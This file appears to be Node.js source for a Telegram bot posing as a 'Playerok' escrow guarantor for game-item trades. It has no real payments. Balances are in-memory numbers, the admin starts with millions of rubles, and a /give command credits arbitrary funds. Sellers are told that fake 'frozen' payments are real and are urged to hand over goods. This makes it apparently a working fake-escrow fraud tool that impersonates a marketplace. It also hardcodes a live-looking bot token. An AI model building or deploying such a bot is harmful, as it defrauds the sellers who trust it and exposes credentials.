const { Telegraf, Markup } = require('telegraf');
const http = require('http');

const bot = new Telegraf('8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
const ADMIN_USERNAME = 'k13_way'; 
const ADMIN_ID = 8886821631; 

let users = {};
let deals = {};
let states = {};

// Железный ручной веб-сервер, который навсегда закроет ошибку портов на Render
const PORT = process.env.PORT || 10000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('OK');
}).listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Порт ${PORT} успешно открыт для Render`);
});

function init(id, name) {
    const un = name ? name.toLowerCase() : '';
    if (!users[id]) {
        users[id] = { id: id, username: un, balance: id === ADMIN_ID ? 16699677 : 0, count: 0 };
    } else if (un) {
        users[id].username = un;
    }
}

function findId(name) {
    if (!name) return null;
    const cl = name.replace('@', '').trim().toLowerCase();
    for (const id in users) { 
        if (users[id].username === cl) return parseInt(id); 
    }
    return null;
}

const menu = Markup.keyboard([
    ['🤝 Создать сделку'],
    ['💳 Баланс', '🛡️ Безопасность'],
    ['ℹ️ О Гарант Боте Playerok', '🆘 Поддержка']
]).resize();

bot.use((ctx, next) => {
    if (ctx.from) init(ctx.from.id, ctx.from.username);
    return next();
});

bot.start((ctx) => {
    delete states[ctx.from.id];
    ctx.replyWithMarkdown('Добро пожаловать 👋\n\n✅ *PlayerOk* — специализированный маркетплейс и торговый гарант по обеспечению полной безопасности внебиржевых сделок.\n\n• Комиссия: 1%\n• Режим работы: 24/7\n• Поддержка: @sw1zyy01', menu);
});

bot.hears('ℹ️ О Гарант Боте Playerok', (ctx) => { delete states[ctx.from.id]; ctx.reply('💎 Playerok Гарант бот — безопасные сделки в Telegram! Все данные защищены.'); });
bot.hears('🛡️ Безопасность', (ctx) => { delete states[ctx.from.id]; ctx.reply('🛡️ Гарант сервис Playerok защищает ваши средства. Деньги покупателя замораживаются.'); });
bot.hears('🆘 Поддержка', (ctx) => { delete states[ctx.from.id]; ctx.reply('🆘 Служба поддержки Playerok Гарант ПРЯМО в Telegram: @sw1zyy01'); });

bot.hears('💳 Баланс', (ctx) => {
    delete states[ctx.from.id];
    init(ctx.from.id, ctx.from.username);
    const u = users[ctx.from.id];
    ctx.replyWithMarkdown(`👑 *ЛИЧНЫЙ КАБИНЕТ PLAYEROK* 👑\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n👤 *Пользователь:* @${ctx.from.username || 'не установлен'}\n🆔 *Ваш ID:* \`${ctx.from.id}\`\n💎 *Статус:* Проверенный трейдер\n📈 *Успешных сделок:* ${u ? u.count : 0}\n\n💵 *Текущий баланс:* [ ${u ? u.balance.toLocaleString('ru-RU') : 0} руб. ]\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`);
});

bot.command('give', (ctx) => {
    if (ctx.from.username?.toLowerCase() !== ADMIN_USERNAME) return ctx.reply('❌ Нет прав.');
    const args = ctx.message.text.split(' '); if (args.length !== 3) return ctx.reply('⚠️ /give [ID] [Сумма]');
    const tId = parseInt(args[1]), am = parseInt(args[2]); if (isNaN(tId) || isNaN(am) || am <= 0) return ctx.reply('❌ Ошибка.');
    init(tId, null); users[tId].balance += am; ctx.reply(`✅ Успешно начислено ${am} руб. пользователю ${tId}`);
    bot.telegram.sendMessage(tId, `💰 Ваш баланс успешно пополнен на: +${am} руб.`).catch(() => {});
});

bot.hears('🤝 Создать сделку', (ctx) => { delete states[ctx.from.id]; ctx.reply('👉 Выберите вашу роль в сделке:', Markup.inlineKeyboard([[Markup.button.callback('🛒 Я хочу Купить', 'role_buy'), Markup.button.callback('💰 Я хочу Продать', 'role_sell')]])); });

bot.action('role_buy', (ctx) => { states[ctx.from.id] = { step: 'info', type: 'buy' }; ctx.answerCbQuery().catch(() => {}); ctx.replyWithMarkdown('🛒 *ОФОРМЛЕНИЕ ПОКУПКИ ТОВАРА*\n\n📝 Отправьте данные одним сообщением строго по шаблону:\n`Сумма Товар @user_name`\n\n📋 *Пример:* `2500 Standoff 2 Account @user_name`'); });
bot.action('role_sell', (ctx) => { states[ctx.from.id] = { step: 'info', type: 'sell' }; ctx.answerCbQuery().catch(() => {}); ctx.replyWithMarkdown('💰 *ОФОРМЛЕНИЕ ПРОДАЖИ ТОВАРА*\n\n📝 Отправьте данные одним сообщением строго по шаблону:\n`Сумма Товар @user_name`\n\n📋 *Пример:* `1500 Нож в Standoff 2 @user_name`'); });

bot.on('text', async (ctx, next) => {
    const uid = ctx.from.id, st = states[uid]; if (!st || st.step !== 'info') return next(); delete states[uid];
    const match = ctx.message.text.trim().match(/^(\d+)\s+(.+?)\s+(@[A-Za-z0-9_]{4,})$/);
    if (!match) return ctx.reply('❌ Неверный формат! Нажмите кнопку «🤝 Создать сделку» заново.');
    const am = parseInt(match[1]), item = match[2], targetUsername = match[3];
    const targetId = findId(targetUsername); if (!targetId) return ctx.reply(`❌ Пользователь ${targetUsername} не найден в базе. Он должен сначала зайти в бота и нажать /start!`);
    if (uid === targetId) return ctx.reply('❌ Ошибка: Нельзя с самим собой.');
    const dId = Math.floor(100000 + Math.random() * 900000);
    deals[dId] = { id: dId, buyerId: st.type === 'buy' ? uid : targetId, sellerId: st.type === 'buy' ? targetId : uid, am, item, status: 'wait' };
    ctx.reply(`⏳ Сделка №${dId} успешно оформлена! Ожидаем подтверждения.`);
    bot.telegram.sendMessage(targetId, `🔔 *ВАМ ПРЕДЛОЖЕНА СДЕЛКА №${dId}!* 🔔\n\n📦 Товар: ${item}\n💰 Сумма: ${am} руб.\n\nВы готовы?`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Подтвердить Сделку', `ok_${dId}`)]]) }).catch(() => {});
});

bot.action(/^ok_(\d+)$/, async (ctx) => {
    ctx.answerCbQuery().catch(() => {}); const dId = parseInt(ctx.match[1]), d = deals[dId]; if (!d || ctx.from.id !== d.sellerId || d.status !== 'wait') return ctx.reply('❌ Ошибка.');
    d.status = 'pay'; ctx.editMessageText(`🤝 Вы приняли сделку №${dId}. Ожидайте оплату покупателем.`);
    bot.telegram.sendMessage(d.buyerId, `🎉 Продавец принял сделку №${dId}!\n\nК оплате: *${d.am} руб.*`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить покупку', `pay_${dId}`)]]) });
});

bot.action(/^pay_(\d+)$/, async (ctx) => {
    ctx.answerCbQuery().catch(() => {}); const dId = parseInt(ctx.match[1]), d = deals[dId]; if (!d || ctx.from.id !== d.buyerId || d.status !== 'pay') return ctx.reply('❌ Ошибка.');
    const b = users[d.buyerId]; if (b.balance < d.am) return ctx.reply(`❌ Недостаточно средств. Баланс: ${b.balance} руб.`);
    b.balance -= d.am; d.status = 'send'; ctx.editMessageText(`💰 Сделка №${dId} успешно оплачена! Средства заморожены.`);
    bot.telegram.sendMessage(d.sellerId, `📢 Покупатель оплатил сделку №${dId}! Деньги заморожены.\n\n👉 Передайте товар покупателю в ЛС. После передачи нажмите кнопку:`, { ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${dId}`)]]) });
});

bot.action(/^sent_(\d+)$/, async (ctx) => {
    ctx.answerCbQuery().catch(() => {}); const dId = parseInt(ctx.match[1]), d = deals[dId]; if (!d || ctx.from.id !== d.sellerId || d.status !== 'send') return ctx.reply('❌ Ошибка.');
    d.status = 'check'; ctx.editMessageText(`👌 Вы передали товар по сделке №${dId}. Ожидайте проверки.`);
    bot.telegram.sendMessage(d.buyerId, `🔔 Товар по сделке №${dId} передан! Проверьте и подтвердите:`, { ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить покупку', `done_${dId}`)]]) });
});

bot.action(/^done_(\d+)$/, async (ctx) => {
    ctx.answerCbQuery().catch(() => {}); const dId = parseInt(ctx.match[1]), d = deals[dId]; if (!d || ctx.from.id !== d.buyerId || d.status !== 'check') return ctx.reply('❌ Ошибка.');
    d.status = 'end'; users[d.sellerId].balance += d.am; users[d.buyerId].count++; users[d.sellerId].count++; ctx.editMessageText(`🎉 Сделка №${dId} завершена!`);
    bot.telegram.sendMessage(d.sellerId, `💰 Сделка №${dId} завершена! +${d.am} руб.`);
});

bot.launch().then(() => console.log('🚀 Бот успешно запущен в режиме Long-polling!'));
